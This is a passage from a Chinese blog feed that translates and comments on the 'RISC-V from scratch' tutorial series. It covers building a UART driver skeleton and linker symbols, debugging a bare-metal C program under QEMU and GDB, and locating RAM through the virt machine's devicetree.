.cfi_endproc<br><br>uart_put_char:<br>    .cfi_startproc<br>    .cfi_endproc<br><br>.end<br></code></pre></td></tr></table></figure><p>我们从 <code>.global</code> 汇编指令开始，将 <code>uart_put_char</code> 和 <code>uart_get_char</code> 声明为其他文件可访问的符号。以 <code>.</code> 开头的指令都是伪指令，它们只向汇编器提供信息，不是可执行代码。所有基本 GNU 汇编器指令的详细说明都可以在<a href="https://ftp.gnu.org/old-gnu/Manuals/gas-2.9.1/html_chapter/as_7.html">这里</a>找到。</p><p>接下来，将会有每个符号的定义，当前仅包含 <code>.cfi</code> 汇编程序指令。这些 <code>.cfi</code> 指令将框架的结构及其展开方法通知工具（例如汇编器或异常展开器）。<code>.cfi_startproc</code> 和 <code>.cfi_endproc</code> 分别表示函数的开始和结束。</p><p>尽管我们还没有完全开始写驱动（你肯定能察觉到我们只是搭建了个框架），我们先把他编译一下，看看这个框架是否可用。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">riscv64-unknown-elf-gcc -g -ffreestanding -O0 -Wl,--gc-sections \<br>    -nostartfiles -nostdlib -nodefaultlibs -Wl,-T,riscv64-virt.ld \<br>    crt0.s ns16550a.s<br></code></pre></td></tr></table></figure><p>如果你很想知道这些编译选项是什么意思，建议参考<a href="https://twilco.github.io/riscv-from-scratch/2019/04/27/riscv-from-scratch-2.html#debugging-but-for-real-this-time">这里</a>。</p><p>然后，我们得到了一个错误：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">/Users/twilco/usys/riscv/riscv64-unknown-elf-gcc-8.2.0-2019.02.0-x86_64-apple-darwin/bin/../lib/gcc/riscv64-unknown-elf/8.2.0/../../../../riscv64-unknown-elf/bin/ld: /var/folders/rg/hbr8vy7d13z9k7pdn0l_n9z51y1g13/T//ccjYQiJc.o: in function `.L0 &#x27;:<br>/Users/twilco/projects/riscv-from-scratch/work/crt0.s:12: undefined reference to `main&#x27;<br>collect2: error: ld returned 1 exit status<br></code></pre></td></tr></table></figure><p>不过，放轻松，只是缺少 <code>main</code> 函数而已。这是因为在 <code>crt0.s</code> 文件中，我们曾经用到过 <code>main</code> 函数的地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs nasm">.section .init, &quot;ax&quot;<br>.global _start<br>_start:<br>    .cfi_startproc<br>    .cfi_undefined ra<br>    .option push<br>    .option norelax<br>    la gp, __global_pointer$<br>    .option pop<br>    la sp, __stack_top<br>    add s0, sp, zero<br>    jal zero, main # &lt;~~~~~~~~~~<br>    .cfi_endproc<br>    .end<br></code></pre></td></tr></table></figure><p>那么，为了简单起见，先创建个文件 <code>main.c</code> ，然后把 <code>main</code> 函数的定义写出来：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    uart_put_char();<br>&#125;<br></code></pre></td></tr></table></figure><p>最后，将这几个文件一起编译，就不会报错了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">riscv64-unknown-elf-gcc -g -ffreestanding -O0 -Wl,--gc-sections \<br>    -nostartfiles -nostdlib -nodefaultlibs -Wl,-T,riscv64-virt.ld \<br>    crt0.s ns16550a.s main.c<br></code></pre></td></tr></table></figure><p>除此之外，我们可以使用 <code>nm</code> 工具，查看一下 <code>a.out</code> 文件里面符号定义的情况：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">riscv64-unknown-elf-nm a.out<br><br>00000000800010a0 R __BSS_END__<br>000000008000109c R __DATA_BEGIN__<br>000000008000109c R __SDATA_BEGIN__<br>000000008000109c R __bss_start<br>000000008000189c A __global_pointer$<br>0000000088000000 T __stack_top<br>000000008000109c R _edata<br>00000000800010a0 R _end<br>0000000080000000 T _start<br>0000000080000018 T main<br>0000000080000018 T uart_get_char<br>0000000080000018 T uart_put_char<br></code></pre></td></tr></table></figure><h2 id="设置基础地址">设置基础地址</h2><p>从这篇<a href="https://www.lammertbies.nl/comm/info/serial-uart.html">资料</a>得知，NS16550A UART 有十二个寄存器，访问每个寄存器只需要在基址的基础上加上若干字节的偏移量即可。为了能方便地访问这些寄存器，我们首先需要定义一个代表该基址的符号。 正如我们从 <code>riscv64-virt.dts</code> 中发现的那样，基址位于 <code>0x00 + 0x10000000 = 0x10000000</code>，这就是 <code>reg</code> 属性中的内容：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">uart<span class="hljs-meta">@10000000</span> &#123;<br>    interrupts = <span class="hljs-variable">&lt;0x0a&gt;</span>;<br>    interrupt-parent = <span class="hljs-variable">&lt;0x02&gt;</span>;<br>    clock-frequency = <span class="hljs-variable">&lt;0x384000&gt;</span>;<br>    reg = <span class="hljs-variable">&lt;0x00 0x10000000 0x00 0x100&gt;</span>;<br>    compatible = <span class="hljs-string">&quot;ns16550a&quot;</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><p>在 <code>riscv64-virt.ld</code> 文件中，加入这个符号：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-params">...</span>more above<span class="hljs-params">...</span><br>SECTIONS<br>&#123;<br>  <span class="hljs-comment">/* Read-only sections, merged into text segment: */</span><br>  <span class="hljs-keyword">PROVIDE</span> (__executable_start = SEGMENT_START(<span class="hljs-string">&quot;text-segment&quot;</span>, <span class="hljs-number">0x10000</span>));<br>  . = SEGMENT_START(<span class="hljs-string">&quot;text-segment&quot;</span>, <span class="hljs-number">0x10000</span>) + SIZEOF_HEADERS;<br>  <span class="hljs-keyword">PROVIDE</span>(__stack_top = ORIGIN(RAM) + LENGTH(RAM));<br>  <span class="hljs-comment">/* &gt;&gt;&gt;&gt;&gt;&gt; Our newest addition. &lt;&lt;&lt;&lt;&lt;&lt; */</span><br>  <span class="hljs-keyword">PROVIDE</span>(__uart_base_addr = <span class="hljs-number">0x10000000</span>);<br>  <span class="hljs-comment">/* &gt;&gt;&gt;&gt;&gt;&gt; End of our addition. &lt;&lt;&lt;&lt;&lt;&lt; */</span><br>  .interp         : &#123; *(.interp) &#125;<br><span class="hljs-params">...</span>more below<span class="hljs-params">...</span><br></code></pre></td></tr></table></figure><p>当 <code>__uart_base_addr</code> 定义完成后，我们就可以很轻松地访问 NS16550A 的寄存器了！</p><h2 id="接下来">接下来</h2><p>今天，我们了解了 UART 和 USART 、NS16550A 规范，中断以及一些其他 devicetree 属性。 我们还为UART 组装驱动程序创建了基础框架，并已将 <code>__uart_base_addr</code> 编码为链接器文件中的符号，以方便对 UART 寄存器访问。</p><p>在下一篇文章中，我们将讨论和实现两个驱动程序函数 <code>uart_get_char</code> 和 <code>uart_put_char</code> 。 函数是在汇编世界中使函数调用成为可能的重要部分。 我们将逐步介绍函数的序幕，并提供详细说明堆栈更改和每条指令寄存器的图表。</p><hr><h2 id="我的尝试">我的尝试</h2><p>OK！原博文翻译到此结束！现在介绍一下我的实验方案：</p><p>事实上，在跟着写完 <code>crt0.s</code> 文件，并将他们编译、链接，运行在虚拟机上时，我的思想就与原博主最初的想法不太一样了，原博主只是想要探究一下 RISC-V 的底层技术，但我想要做的却是一个 RISC-V 内核。</p><p>原博主的实验步骤中，创建 <code>crt0.s</code> 以及它的前因后果解释非常详细，让我受益良多。但同时我也马上明白，这些步骤只要再稍加调整，就完全可以当作操作系统的启动工作了！那么接下来，我将会继续我自己的实验，敬请期待。</p>]]></content>
    
    
    <categories>
      
      <category>RISC-V</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RISC-V</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RISC-V from Scratch 2</title>
    <link href="/2020/07/26/2020-7-26-riscv-from-scratch-2/"/>
    <url>/2020/07/26/2020-7-26-riscv-from-scratch-2/</url>
    
    <content type="html"><![CDATA[<h1>RISC-V from scratch 2</h1><p>今天，我们继续翻译 <em>RISC-V from scratch</em> 系列的第二部分，原文<a href="https://twilco.github.io/riscv-from-scratch/2019/04/27/riscv-from-scratch-2.html">链接</a>。<a href="https://github.com/twilco/riscv-from-scratch">这是</a>该系列的 github 库。</p><h2 id="简介">简介</h2><p>快速回顾，通过 <em>RISC-V from scratch</em> 系列课程，我们将会探索很多与 RISC-V 及其生态相关的底层概念（例如编译、链接、原语运行时、汇编等）。在<a href="https://dingfen.github.io/2020/07/24/riscv-from-scratch-1.html">第一篇博文</a>中，我们简短的讨论一下 RISC-V 以及为什么它很重要，并搭建起 RISC-V 的工具链，最后在 RISC-V 模拟器和 <a href="https://github.com/sifive/freedom-e-sdk">SiFive’s freedom-e-sdk</a> 的帮助下构建并运行一个简单的 C 程序。</p><p><code>Freedom-e-sdk</code> 使我们在仿真或真正的 RISC-V 处理器上编译，调试和运行任何 C 程序变得很简单。不必担心什么链接脚本、编写运行时来设置堆栈，调用main等的运行时。如果你希望快速提高工作效率，那就太好了，但是这些细节正是我们想要学习的东西！</p><p>在这篇文章中，我们将摆脱 <code>freedom-e-sdk</code> 。我们将编写并尝试调试自己的 C 程序，揭示隐藏在 main 后面的秘密，并检查 <code>qemu</code> 虚拟机的硬件布局。然后，我们将检查和修改链接器脚本，编写自己的 C 运行时以设置并运行我们的程序，最后调用 GDB 并逐步执行程序。</p><h2 id="搭建环境"><a href="https://dingfen.github.io/2020/07/24/riscv-from-scratch-1.html#qemu-and-risc-v-toolchain-setup">搭建环境</a></h2><p>如果你还未看本系列博客的第一部分，没有安装 <code>riscv-qemu</code> 和 RISC-V 工具链，那么赶紧点击上面标题的链接，跳转到 <a href="https://twilco.github.io/riscv-from-scratch/2019/03/10/riscv-from-scratch-1.html#qemu-and-risc-v-toolchain-setup">“QEMU and RISC-V toolchain setup”</a> 。</p><p>之后，再将博主创建的 github 库下载下来，作为我们的工作点。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone git@github.com:twilco/riscv-from-scratch.git<br><span class="hljs-meta prompt_"># </span><span class="language-bash">or `git <span class="hljs-built_in">clone</span> https://github.com/twilco/riscv-from-scratch.git` to <span class="hljs-built_in">clone</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">via HTTPS rather than SSH</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">alternatively, <span class="hljs-keyword">if</span> you are a GitHub user, you can fork this repo.</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">https://help.github.com/en/articles/fork-a-repo</span><br>cd riscv-from-scratch/work<br></code></pre></td></tr></table></figure><p>译注：亲测无需下载 github 库也可实现下面的实验。</p><h2 id="天真的方法">天真的方法</h2><p>好，让我们写一个简单的 C 程序，开始我们的旅途！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// file: riscv-from-scratch/work/add.c</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> a = <span class="hljs-number">4</span>;<br>    <span class="hljs-type">int</span> b = <span class="hljs-number">12</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-type">int</span> c = a + b;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们想要跑该程序，第一步就是编译它，生成相应的可执行文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">-O0 to <span class="hljs-built_in">disable</span> all optimizations. Without this, GCC might optimize</span> <br><span class="hljs-meta prompt_"># </span><span class="language-bash">away our infinite addition since the result <span class="hljs-string">&#x27;c&#x27;</span> is never used.</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">-g to tell GCC to preserve debug info <span class="hljs-keyword">in</span> our executable.</span><br>riscv64-unknown-elf-gcc add.c -O0 -g<br></code></pre></td></tr></table></figure><p>编译器生成了 <code>a.out</code> 文件，这是 <code>gcc</code> 在没有给定生成文件名字的情况下的默认名。现在，我们可以在 <code>qemu</code> 里面运行它了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># -machine tells QEMU which among our list of available machines we want to</span><br><span class="hljs-comment"># run our executable against.  Run qemu-system-riscv64 -machine help to list</span><br><span class="hljs-comment"># all available machines.</span><br><span class="hljs-comment"># -m is the amount of memory to allocate to our virtual machine.</span><br><span class="hljs-comment"># -gdb tcp::1234 tells QEMU to also start a GDB server on localhost:1234 where</span><br><span class="hljs-comment"># TCP is the means of communication.</span><br><span class="hljs-comment"># -kernel tells QEMU what we&#x27;re looking to run, even if our executable isn&#x27;t </span><br><span class="hljs-comment"># exactly a &quot;kernel&quot;.</span><br>qemu-system-riscv64 -machine virt -m 128M -gdb tcp::1234 -kernel a.out<br></code></pre></td></tr></table></figure><p>我们选择了 <code>virt</code> RISC-V 虚拟机，它是 <code>riscv-qemu</code> <a href="https://github.com/riscv/riscv-qemu/wiki#machines">自带的</a>。</p><p>既然我们的程序已经在 QEMU 中运行，并且在主机端口 1234 打开了 TCP 连接，用于连接 GDB ，那么我们在另一个终端，打开 GDB 与之相连吧：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">--tui gives us a (t)extual (ui) <span class="hljs-keyword">for</span> our GDB session.</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">While we can start GDB without any arguments, specifying <span class="hljs-string">&#x27;a.out&#x27;</span> tells GDB</span> <br><span class="hljs-meta prompt_"># </span><span class="language-bash">to load debug symbols from that file <span class="hljs-keyword">for</span> the newly created session.</span><br>riscv64-unknown-elf-gdb --tui a.out<br></code></pre></td></tr></table></figure><p>进入了 GDB 的界面：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">This GDB was configured as &quot;--host=x86_64-apple-darwin17.7.0 --target=riscv64-unknown-elf&quot;.           │<br>Type &quot;show configuration&quot; for configuration details.                                                  │<br>For bug reporting instructions, please see:                                                           │<br>&lt;http://www.gnu.org/software/gdb/bugs/&gt;.                                                              │<br>Find the GDB manual and other documentation resources online at:                                      │<br>    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.                                                 │<br>                                                                                                      │<br>For help, type &quot;help&quot;.                                                                                │<br>Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...                                       │<br>Reading symbols from a.out...                                                                         │<br>(gdb) <br></code></pre></td></tr></table></figure><p>当然，我们还需要告诉 GDB 有一个已经在运行的程序在等着它调试，这和平时使用 GDB 调试程序不同，因为现在我们要调试的程序运行在另一个”机器“上。我们需要打开 TCP 连接，并选择相应的端口，使 GDB 与 程序相连：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">(gdb) target remote :1234                                                                             │<br>Remote debugging using :1234<br></code></pre></td></tr></table></figure><p>现在，我们设置断点了</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">(gdb) b main<br>Breakpoint <span class="hljs-number">1</span> <span class="hljs-keyword">at</span> <span class="hljs-number">0x1018e</span>: <span class="hljs-built_in">file</span> <span class="hljs-built_in">add</span>.c, <span class="hljs-built_in">line</span> <span class="hljs-number">2.</span><br>(gdb) b <span class="hljs-number">5</span> <span class="hljs-comment"># this is the line within the forever-while loop. int c = a + b;</span><br>Breakpoint <span class="hljs-number">2</span> <span class="hljs-keyword">at</span> <span class="hljs-number">0x1019a</span>: <span class="hljs-built_in">file</span> <span class="hljs-built_in">add</span>.c, <span class="hljs-built_in">line</span> <span class="hljs-number">5.</span><br></code></pre></td></tr></table></figure><p>最后，让程序继续运行，直到遇见断点。</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang">(gdb) c<br>        Continuing.<br></code></pre></td></tr></table></figure><p>很快，你就会发现程序一直卡死在这里，不会遇到我们之前设置的断点。这到底是怎么一回事呢？我们可以先看一下 GDB 给我们提供的信息：</p><p><img src="https://twilco.github.io/img/naive_gdb.png" alt=""></p><p>看一下图中的几个红框：</p><ol><li>GDB 无法找到源代码，这原本是展示源代码和断点位置的地方</li><li>GDB 不知道现在运行到第几行，并且 PC 值是 0x0。</li><li>圈出来的值全是 0x0000，很明显 GDB 不知道具体断点位置</li></ol><h2 id="揭开-v-的面纱">揭开 -v 的面纱</h2><p>为了探明之前究竟发生了什么，我们必须先了解一下 C 程序到底是（尤其是在我们看不见的地方）怎么工作的。我们的程序都有一个 <code>main</code> 函数，但是究竟什么是 <code>main</code> 函数？为什么我们把它叫做 <code>main</code> 而不是 <code>origin</code>、<code>begin</code> 或者 <code>entry</code>？很多人都知道我们的程序从 <code>main</code> 开始运行，但究竟是什么魔力使它如此运作？</p><p>为了回答这些问题，我们要重新使用 GCC <code>-v</code> 编译一下之前的程序，<code>-v</code> 可以帮助我们获取实际操作的详细输出。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">In the `riscv-from-scratch/work` directory...</span><br>riscv64-unknown-elf-gcc add.c -O0 -g -v<br></code></pre></td></tr></table></figure><p>第一件我们需要明白的事情就是，虽然 GCC 是 “GNU C Compiler” 的缩写，<code>gcc</code> 还是会默认链接我们的代码，并且汇编它（加<code>-c</code> 才会告诉 GCC 只进行编译）。那么这和我们之前要探讨的问题有何关系呢？</p><p>接下来，我们再细看一下刚刚 GCC 给我们打印出来的信息。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">The actual `gcc -v` <span class="hljs-built_in">command</span> outputs full paths, but those are quite</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">long, so pretend these variables exist.</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-variable">$RV_GCC_BIN_PATH</span> = /Users/twilcock/usys/riscv/riscv64-unknown-elf-gcc-&lt;<span class="hljs-built_in">date</span>&gt;-&lt;version&gt;/bin/</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-variable">$RV_GCC_LIB_PATH</span> = <span class="hljs-variable">$RV_GCC_BIN_PATH</span>/../lib/gcc/riscv64-unknown-elf/8.2.0</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">RV_GCC_BIN_PATH/../libexec/gcc/riscv64-unknown-elf/8.2.0/collect2 \</span><br><span class="language-bash">  ...truncated...</span> <br><span class="hljs-meta prompt_">  $</span><span class="language-bash">RV_GCC_LIB_PATH/../../../../riscv64-unknown-elf/lib/rv64imafdc/lp64d/crt0.o \ </span><br><span class="hljs-meta prompt_">  $</span><span class="language-bash">RV_GCC_LIB_PATH/riscv64-unknown-elf/8.2.0/rv64imafdc/lp64d/crtbegin.o \</span><br><span class="language-bash">  -lgcc --start-group -lc -lgloss --end-group -lgcc \ </span><br><span class="hljs-meta prompt_">  $</span><span class="language-bash">RV_GCC_LIB_PATH/rv64imafdc/lp64d/crtend.o</span><br>  ...truncated...<br>COLLECT_GCC_OPTIONS=&#x27;-O0&#x27; &#x27;-g&#x27; &#x27;-v&#x27; &#x27;-march=rv64imafdc&#x27; &#x27;-mabi=lp64d&#x27;<br></code></pre></td></tr></table></figure><p>不得不承认，即使我裁剪了很多信息，这些信息依然太过于复杂。我必须再详细解释一下。在第一行，<code>gcc</code> 在运行一个名叫 <code>collect2</code> 的程序，并且把参数比如 <code>crt0</code>，<code>crtbegin.o</code> 和 <code>crtend.o</code>，并设置了 <code>-lgcc --start-group</code>等一些 flag 。从 <a href="https://gcc.gnu.org/onlinedocs/gccint/Collect2.html">collect2</a> 来看，简而言之，<code>collect2</code> 在开始阶段将很多初始化函数一个一个地链接起来。</p><p>知道了这些后，就可以明白事实上 GCC 是把多个不同的 <code>crt</code> 文件和我们自己写的代码链接起来，<code>crt</code>是 “C runtime” 的缩写，你可以<a href="https://stackoverflow.com/a/27786892/2421349">仔细阅读了解一下每个 crt 是用来干嘛的</a>，不过不用担心，我们目前只关注 <code>crt0</code>这个文件，它有个很重要的作用：</p><blockquote><p><em>This object [crt0] is expected to contain the</em> <code>_start</code> <em>symbol, which takes care of bootstrapping the initial execution of the program.</em></p><p>目标对象 crt0 应该包含 <code>_start</code> 符号，该符号用于引导程序的初始执行。</p></blockquote><p>执​​行的这种初始引导还是要取决于所使用的平台，但是通常它包括重要的任务，例如<strong>设置堆栈框架，传递命令行参数以及调用 <code>main</code></strong>。是的，我们终于回答了本节开头的问题——<code>_start</code> 调用了我们的 <code>main</code> 函数！</p><h2 id="找到我们的堆栈">找到我们的堆栈</h2><p>终于解决了一个问题，但你可能更想知道这和我们最初的目标有什么关系，即能够逐步使用 GDB 来完成简单的 C 程序。在那之前，我们还需要解决另一些问题，首先要解决的问题是 <code>crt0</code> 设置堆栈的方式。</p><p>我们之前看到，<code>gcc</code> 链接了 <code>crt0</code> 文件，这个 <code>crt0</code>被选中，是根据如下几点做出的决策：</p><ul><li>目标平台，包括机器、供应商、操作系统，在本文中，指的是 <code>riscv64-unknown-elf</code></li><li>目标 ISA <code>rv64imafdc</code></li><li>目标 ABI <code>lp64d</code></li></ul><p>之前提到过，<code>crt0</code> 的一个工作是建立堆栈，但如果我们不知道 CPU 会把哪里当作堆栈，我们还能怎么办呢？确实，神仙来了也办不了，因此，我们需要更多的信息。</p><p>回到我们最初开始运行 <code>qemu</code> 的地方，<code>qemu-system-riscv64 -machine virt -m 128M -gdb tcp::1234 -kernel a.out</code> 可以看到我们使用了 virt 机器，可喜的是，<code>qemu</code> 把这个机器的 dump 信息全都给了我们，它放在了 <code>dtb</code>格式的文件中。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">In the `riscv-from-scratch/work` directory...</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Use qemu to dump info about the <span class="hljs-string">&#x27;virt&#x27;</span> machine <span class="hljs-keyword">in</span> dtb (devicetree blob)</span> <br><span class="hljs-meta prompt_"># </span><span class="language-bash">format.</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">The data <span class="hljs-keyword">in</span> this file represents hardware components of a given</span> <br><span class="hljs-meta prompt_"># </span><span class="language-bash">machine / device / board.</span><br>qemu-system-riscv64 -machine virt -machine dumpdtb=riscv64-virt.dtb<br></code></pre></td></tr></table></figure><p>然而 <code>dtb</code> 格式人类是无法轻易看懂的，但有一个工具 <code>dtc</code> (devicetree compiler) 可以转换成我们可读的内容。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">I<span class="hljs-string">&#x27;m running MacOS, so I use Homebrew to install this. If you&#x27;</span>re</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">running another OS you may need to <span class="hljs-keyword">do</span> something <span class="hljs-keyword">else</span>.</span><br>brew install dtc<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Convert our .dtb into a human-readable .dts (devicetree <span class="hljs-built_in">source</span>) file.</span><br>dtc -I dtb -O dts -o riscv64-virt.dts riscv64-virt.dtb<br></code></pre></td></tr></table></figure><p>它生成了 <code>riscv64-virt.dts</code> 文件，里面包含了很多关于 virt 的信息，例如 CPU 核数量，外围设备（例如：UART 挖个小坑）的内存映射地址，以及 RAM 。我们想让我们的堆栈放在合适的位置，那么我们就找到它：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">grep memory riscv64-virt.dts -A 3<br>        memory@80000000 &#123;<br>                device_type = &quot;memory&quot;;<br>                reg = &lt;0x00 0x80000000 0x00 0x8000000&gt;;<br>        &#125;;<br></code></pre></td></tr></table></figure><p>可以看到 <code>device_type</code> 是 “memory” ，而其值，<code>reg = &lt;...&gt;</code>可以告诉我们想要的，比如内存从哪里开始，有多长。</p><p>参考<a href="https://buildmedia.readthedocs.org/media/pdf/devicetree-specification/latest/devicetree-specification.pdf">the devicetree specification</a>，我们看到 reg 的语法是任意数量的 <code>(base_address，length)</code> 对。但是，reg 内部有四个值——定义一个 memory 不应该只需要两个值吗？</p><p>再看一下<a href="https://buildmedia.readthedocs.org/media/pdf/devicetree-specification/latest/devicetree-specification.pdf">the devicetree specification</a>，我了解到，指定地址和长度所需的 &lt;u32&gt; 单元数由节点的父节点（或节点本身）中的 <code>#address-cells</code> 和 <code>#size-cells</code> 属性确定。这些值未在我们的内存节点中指定，并且内存节点的父节点只在文件的根部分，让我们在其中查找以下值：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">head -n8 riscv64-virt.dts<br>/dts-v1/;<br><br>/ &#123;<br>        #address-cells = &lt;0x02&gt;;<br>        #size-cells = &lt;0x02&gt;;<br>        compatible = &quot;riscv-virtio&quot;;<br>        model = &quot;riscv-virtio,qemu&quot;;<br></code></pre></td></tr></table></figure><p>它用了两个 32-bit 的值来确定一个地址，两个 32-bit 的值确定长度，这意思着， <code>reg = &lt;0x00 0x80000000 0x00 0x8000000&gt;</code> ，那么我们的内存起始于 <code>0x00 + 0x80000000</code>，并且长度为 <code>0x00+0x8000000</code> 字节，意味着它结束于 <code>0x88000000</code>，更简洁的说法是，始于 <code>0x80000000</code>的长度为128M 的内存。</p><h2 id="链接起来">链接起来</h2><p>好，使用 <code>qemu</code> 和 <code>dtc</code> ，我们可以成功地找到 RAM 的位置、长度，我们也知道 GCC 会链接默认的 <code>crt0</code> ，并建起一个不是我们想要的堆栈，那么基于这些信息，我们到底该怎么做，才能得到一个可以运行、调试的程序呢？</p><p>好吧，看来默认的 <code>crt0</code> 并没有完成我们想要的工作，因此我们必须编写自己的 <code>crt0</code>，然后将其编译，并与我们写的 C 程序链接。我们的 